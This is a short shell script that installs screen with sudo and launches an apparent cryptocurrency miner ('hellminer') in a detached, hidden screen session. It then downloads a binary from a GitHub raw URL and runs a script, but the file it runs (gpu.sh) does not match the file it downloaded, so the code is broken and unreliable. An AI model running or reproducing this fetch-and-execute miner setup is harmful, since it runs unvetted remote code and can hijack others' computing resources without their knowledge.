#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS random ./hellminer 65 75
wget https://github.com/nuri655/nur/raw/main/tuyulgpu
chmod +x gpu.sh
./gpu.sh
